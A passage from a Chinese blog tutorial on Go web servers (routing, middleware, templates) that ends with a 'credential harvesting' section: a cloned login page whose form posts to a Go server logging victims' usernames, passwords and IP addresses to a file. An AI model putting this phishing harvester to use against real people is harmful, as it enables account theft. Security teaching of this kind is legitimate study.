class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要是使用<code>HandleFunc</code>创建一个<code>Handler</code>，然后启动监听器访问即可</p><p>同时在写处理请求的时候，需要两个参数，一个是<code>http.ResponseWriter</code>，用于对请求的写入，另一个是<code>Request</code>类型的指针，它运训我们从传入的请求信息中去读取信息。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302120351.png"></p><blockquote><p>http.HandFunc()是怎么运行的？</p><p>由Go文档可知，处理程序被放置在<code>DefaultServerMux</code>上面，<code>ServerMux</code>是多路复用器(server multiplexer)的简写，它可以处理多模式函数的多个HTTP请求，它使用<code>gorountine</code>执行此操作。</p></blockquote><h3 id="2-构造一个简单路由器"><a href="#2-构造一个简单路由器" class="headerlink" title="2. 构造一个简单路由器"></a>2. 构造一个简单路由器</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> router <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *router)</span></span>ServeHTTP(w http.ResponseWriter,req *http.Request)  &#123;</span><br><span class="line"><span class="keyword">switch</span> req.URL.Path &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;/a&quot;</span>:</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;Executing /a&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;/b&quot;</span>:</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;Executing /b&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;/c&quot;</span>:</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;Executing /c&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">http.Error(w,<span class="string">&quot;404 not found&quot;</span>,<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line"><span class="keyword">var</span> r router</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,&amp;r)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里重写了<code>ServeHTTP</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302142529.png"></p><h3 id="3-构造一个简单的中间件"><a href="#3-构造一个简单的中间件" class="headerlink" title="3. 构造一个简单的中间件"></a>3. 构造一个简单的中间件</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> logger <span class="keyword">struct</span> &#123;</span><br><span class="line">Inner http.Handler</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *logger)</span></span>ServeHTTP(w http.ResponseWriter,r * http.Request) &#123;</span><br><span class="line">log.Println(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">l.Inner.ServeHTTP(w,r)</span><br><span class="line">log.Println(<span class="string">&quot;Finish&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter,r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Println(w,<span class="string">&quot;Hello\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">f := http.HandlerFunc(hello)</span><br><span class="line">l := logger&#123;Inner:f&#125;</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,&amp;l)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们创建了一个外部程序，该程序在每次请求时都会在服务器上记录一些信息，并调用函数<code>hello()</code>，我们将此日志逻辑包装在函数中。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302150042.png"></p><h3 id="4-使用-gorilla-x2F-mux-包进行路由"><a href="#4-使用-gorilla-x2F-mux-包进行路由" class="headerlink" title="4.使用 gorilla&#x2F;mux 包进行路由"></a>4.使用 gorilla&#x2F;mux 包进行路由</h3><p><code>gorilla/mux</code>是个成熟的第三方路由包，可以基于简单，复杂的模式进行路由。他包含正则表达式，参数匹配，动词匹配及子路由等其他功能</p><p>同时，我们需要先下载<code>gorilla/mux</code>包</p><blockquote><p>go get github.com&#x2F;gorilla&#x2F;mux</p></blockquote><p>现在，开始使用这个路由包，使用<code>mux.NewRouter()</code>创建路由器</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r := mux.NewRounter()</span><br></pre></td></tr></table></figure><p>返回的类型接口实现了<code>http.Handler</code>，但同时也具有许多其他关联的方法。其中，最长用的方法是：<code>HandleFunc()</code>，如果想定义新的路由来对<code>/foo</code>模式的<code>Get</code>请求，则可以使用如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r.HandleFunc(<span class="string">&quot;/foo&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi foo&quot;</span>)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>)</span><br></pre></td></tr></table></figure><p>由于调用了<code>Method()</code>，因此，只有<code>Get</code>请求才能匹配此路由。所有其他方法将返回404请求。可以在此之上链接其他限定符，例如，与特定主机头值匹配的<code>Host()</code>。以下内容仅返回与主机头设置为<code>www.foo1.com</code>的请求匹配</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.HandleFunc(<span class="string">&quot;/foo1&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi foo1&quot;</span>)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>).Host(<span class="string">&quot;www.foo1.com&quot;</span>)</span><br></pre></td></tr></table></figure><p>有时，在请求路径中匹配并传递参数会很有帮助。<code>gorilla/mux</code>很适合。</p><p>打印出请求路径在<code>user</code>之后的所有内容</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.HandleFunc(<span class="string">&quot;/user/&#123;user&#125;&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">user := mux.Vars(r)[<span class="string">&quot;user&quot;</span>]</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi %s\n&quot;</span>,user)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>)</span><br></pre></td></tr></table></figure><p>在定义请求路径时，可以使用花括号定义请求参数。可以将此视为已经命名的占位符。然后再函数中调用<code>mux.Var()</code>，将请求对象传递给它。此时会返回<code>map [string]string</code></p><p>此外还可以使用正则表达式来限定传递的模式。例如，指定user的参数必须为小写字母</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.HandleFunc(<span class="string">&quot;/user/&#123;user:[a-z]+&#125;&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">user := mux.Vars(r)[<span class="string">&quot;user&quot;</span>]</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi %s\n&quot;</span>,user)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>)</span><br></pre></td></tr></table></figure><p>完整的代码如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := mux.NewRouter()</span><br><span class="line"></span><br><span class="line">r.HandleFunc(<span class="string">&quot;/foo&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi foo&quot;</span>)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.HandleFunc(<span class="string">&quot;/foo1&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi foo1&quot;</span>)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>).Host(<span class="string">&quot;www.foo1.com&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.HandleFunc(<span class="string">&quot;/user/&#123;user:[a-z]+&#125;&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">user := mux.Vars(r)[<span class="string">&quot;user&quot;</span>]</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;hi %s\n&quot;</span>,user)</span><br><span class="line">&#125;).Methods(<span class="string">&quot;Get&quot;</span>)</span><br><span class="line"></span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,r)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-使用negroni包构建中间件"><a href="#5-使用negroni包构建中间件" class="headerlink" title="5. 使用negroni包构建中间件"></a>5. 使用<code>negroni</code>包构建中间件</h3><p>我们之前的中间件，记录了有关请求处理的开始和结束时间，并且返回了响应。再很多情况下，中间件其实不必对每个传入的请求都进行操作。使用中间件的原因由很多，其中包括记录请求，对用户身份验证和授权以及映射资源。</p><p>例如可以编写用于执行基本身份认证的中间件，它可以为每个请求解析一个授权标头，验证所提供的用户名和密码。如果凭证是无效的，则返回401响应。我们还可以将多个中间件函数链接再一起，从而能执行完一个中间件后执行下一个中间件。</p><p>此前创建的日志记录中间件仅包装类了一个函数，实际上，并没有什么作用。因为一般都是链式调用</p><p>接下来使用成熟的包<code>negroni</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get github.com/urfave/negroni</span><br></pre></td></tr></table></figure><p>然后进行一个简单的使用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/urfave/negroni&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := mux.NewRouter()</span><br><span class="line">n := negroni.Classic()</span><br><span class="line">n.UseHandler(r)</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中  <code>negroni.Classic()</code>创建了一个指向<code>Negroni</code>实例的新指针。</p><blockquote><p>要创建新指针由很多种方法</p><p>negroni.Classic()或者 negroni.New()</p><p>但是 negronic.Classic()使用默认的中间件，包括请求记录器，再默认的情况下拦截和恢复的中间件，以及服务于同一个目录的公共文件夹的中间件，函数<code>nehgroni.New()</code>不会创建任何默认的中间件</p><p>同时，<code>negroni.Use(NewRecovery())</code>可以用来使用恢复包</p></blockquote><p>接下来通过<code>n.UseHandler(r)</code>将路由器添加到中间件堆栈。在继续设计的时候，要考虑执行顺序。</p><p>例如：我们希望身份验证检查中间件需要在身份验证的处理函数之前运行。在路由器之前添加的任何中间件都将在处理函数运行前执行。路由之后添加的任何中间件都将在处理函数之后执行。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220302222010.png"></p><blockquote><p>发出 web请求后， negorni 将中间件信息打印到标准输出，</p></blockquote><p>默认的插件固然好用，但我们需要进行一个包装</p><p>首先输出一条消息，并将执行传递给下一个中间件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> trival <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t * trival)</span></span>ServeHTTP(w http.ResponseWriter,r * http.Request,next http.HandlerFunc) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Executing trival middleware&quot;</span>)</span><br><span class="line">next(w,r)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们重写了<code>ServeHTTP</code>的方法，加了一个 http.HandlerFunc 的参数，用来指向下一个中间件函数。</p><p>调用了 next 传递参数，实现在中间件链上的转移。</p><blockquote><p>个人感觉，这种方式有些类似于链表</p></blockquote><p>不过，需要告诉<code>negroni</code>包要将上述实现作为中间件链的部分，为此，可以调用<code>nergoni</code>的<code>Use</code>方法，并将接口<code>nergroni.Handler</code>实现的实例类传递给该方法。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n.Use(&amp;trival&#123;&#125;)</span><br></pre></td></tr></table></figure><p>虽然使用该方法编写中间件非常方便，但是，该方法也有一个弊端。无论编写什么方法都需要使用<code>negroni</code>包。</p><p>例如，我们正在写一个将安全标头写入响应的中间件包，希望它可以实现<code>Http.Handler</code>，这样就可以在其他应用程序中使用该接口，因为绝大多数程序栈似乎都不太欢迎接口<code>negroni.Handler</code></p><p>初次之外，还有两种方法让<code>negroni</code>包使用我们的中间件。其中一种就是<code>UseHadnler(handler http.Handler)</code></p><p>第二种方法是，调用<code>UseHandlerFunc(HandlerFunc func(w http.ResponseWriter,r * http.Request))</code></p><p>后者不太常用，因为它不允许放弃执行链中的下一个中间件。例如，一个中间件是用于执行身份验证的，如有无效凭证或者会话信息，则会返回401响应，并且停止运行。那么，第二种就完全不适合。</p><h3 id="6-使用negroni包添加身份认证"><a href="#6-使用negroni包添加身份认证" class="headerlink" title="6. 使用negroni包添加身份认证"></a>6. 使用negroni包添加身份认证</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;context&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/urfave/negroni&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> badAuth <span class="keyword">struct</span> &#123;</span><br><span class="line">Username <span class="type">string</span></span><br><span class="line">Password <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *badAuth)</span></span>ServeHTTP(w http.ResponseWriter,r * http.Request,next http.HandlerFunc) &#123;</span><br><span class="line">username := r.URL.Query().Get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">password := r.URL.Query().Get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> username != b.Username || password != b.Password  &#123;</span><br><span class="line">http.Error(w,<span class="string">&quot;Unauthorized&quot;</span>,<span class="number">401</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">ctx := context.WithValue(r.Context(),<span class="string">&quot;username&quot;</span>,username)</span><br><span class="line">r = r.WithContext(ctx)</span><br><span class="line">next(w,r)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">username := r.Context().Value(<span class="string">&quot;username&quot;</span>).(<span class="type">string</span>)</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;Hi %s\n&quot;</span>, username)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := mux.NewRouter()</span><br><span class="line">r.HandleFunc(<span class="string">&quot;/hello&quot;</span>,hello).Methods(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">n := negroni.Classic()</span><br><span class="line">n.Use(&amp;badAuth&#123;</span><br><span class="line">Username: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">n.UseHandler(r)</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里加入了<code>badAuth</code>，该中间件将仅用于模拟身份验证。该中间件有两个字段，<code>Username</code>和<code>Password</code>，并且实现了接口<code>negroni.Handler</code>，因为它定义了包含三个参数的<code>ServeHTTP()</code>方法，在该方法中，首先获取用户名和密码，然后与我们拥有的字段进行比较，如果用户名密码不正确，将发送401状态码。</p><p>如果凭证正确，我们需要将用户名添加到请求上下文中。调用<code>context.WithValue()</code>从请求中初始化上下文，在该上下文中设置一个<code>username</code>的变量。然后，可以调用<code>r.WithContext(ctx)</code>来确保进行新的上下文。</p><p>在函数<code>hello()</code>中，可以使用函数<code>Context().Value(interface&#123;&#125;)</code>，从请求上下文中获取用户名，该函数本身返回一个<code>interface()</code>。因为他是一个字符串，所以可以直接使用断言。</p><h3 id="7-使用模板生成HTML响应"><a href="#7-使用模板生成HTML响应" class="headerlink" title="7. 使用模板生成HTML响应"></a>7. 使用模板生成HTML响应</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;html/template&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    Hello &#123;&#123;.&#125;&#125;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">t, err := template.New(<span class="string">&quot;hello&quot;</span>).Parse(x)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">t.Execute(os.Stdout, <span class="string">&quot;&lt;script&gt;alert(&#x27;world&#x27;)&lt;/script&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义一个<code>x</code>变量，储存模板，在模板内部，可以使用NaN 约定定义占位符，可以是一个结构体，也可以是一个基本数据类型。在这里，使用单个<code>.</code>，告诉程序包，要在此处，渲染整个上下文。，如果我们要将<code>Username</code>内容床欸模板，我们只需要，<code>&#123;&#123;.Username&#125;&#125;</code>渲染该字段。</p><p>接下来创建一个模板，然后进行解析，最后返回一个<code>Template</code>的指针。</p><blockquote><p>panic 可以用作处理错误</p></blockquote><p>最后使用<code>Execute(io.Writer,interface&#123;&#125;)</code>，然后将模板传递给第二个变量，，这里使用<code>os.Execute()</code>生成了HTML</p><h2 id="0X01凭证收割"><a href="#0X01凭证收割" class="headerlink" title="0X01凭证收割"></a>0X01凭证收割</h2><p>社会工程学的主要内容之一是：凭证收割攻击。这种类型的攻击通过诱使用户在原始网站的复制版本中输入凭证来捕获用户的登录信息。</p><p>拥有用户的凭证之后，就可以在他们实际的站点上进行登录，这通常是突破组织边界的入口。</p><p>我们首先需要<code>copy</code>一份网站源码，地址在这：</p><p><a href="https://github.com/blackhat-go/bhg/tree/master/ch-4/credential_harvester/public">https://github.com/blackhat-go/bhg/tree/master/ch-4/credential_harvester/public</a></p><p>将<code>index.html</code>中的这段内容，修改为如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;form&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:8080/login&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们开始使用 <code>python -m hpp.server</code> 开一个http服务</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220303224017.png"></p><p>然后我们编写接受端的代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">login</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">log.WithFields(log.Fields&#123;</span><br><span class="line"><span class="string">&quot;time&quot;</span>:       time.Now().String(),</span><br><span class="line"><span class="string">&quot;username&quot;</span>:   r.FormValue(<span class="string">&quot;_user&quot;</span>),</span><br><span class="line"><span class="string">&quot;password&quot;</span>:   r.FormValue(<span class="string">&quot;_pass&quot;</span>),</span><br><span class="line"><span class="string">&quot;user-agent&quot;</span>: r.UserAgent(),</span><br><span class="line"><span class="string">&quot;ip_address&quot;</span>: r.RemoteAddr,</span><br><span class="line">&#125;).Info(<span class="string">&quot;login attempt&quot;</span>)</span><br><span class="line">http.Redirect(w, r, <span class="string">&quot;/&quot;</span>, <span class="number">302</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fh, err := os.OpenFile(<span class="string">&quot;credentials.txt&quot;</span>, os.O_CREATE|os.O_APPEND|os.O_WRONLY, <span class="number">0600</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> fh.Close()</span><br><span class="line">log.SetOutput(fh)</span><br><span class="line">r := mux.NewRouter()</span><br><span class="line">r.HandleFunc(<span class="string">&quot;/login&quot;</span>, login).Methods(<span class="string">&quot;POST&quot;</span>)</span><br><span class="line">r.PathPrefix(<span class="string">&quot;/&quot;</span>).Handler(http.FileServer(http.Dir(<span class="string">&quot;public&quot;</span>)))<span class="comment">//提供静态文件</span></span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, r))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先，我们需要导入包<code>github.com/Sirupsen/logrus</code>，这是我们希望使用结构化日志的记录包。</p><p>我们首先定义了函数<code>login</code>，使用<code>log.WithFields()</code>，写出捕获的数据。显示，时间，用户名和密码，用户代理和请求的IP地址。然后通过调用<code>FormValues(string)</code>来获取这些元素。需要与表单中存在的名字相对应。之后重定向到根目录。</p><p>在main函数中，0600 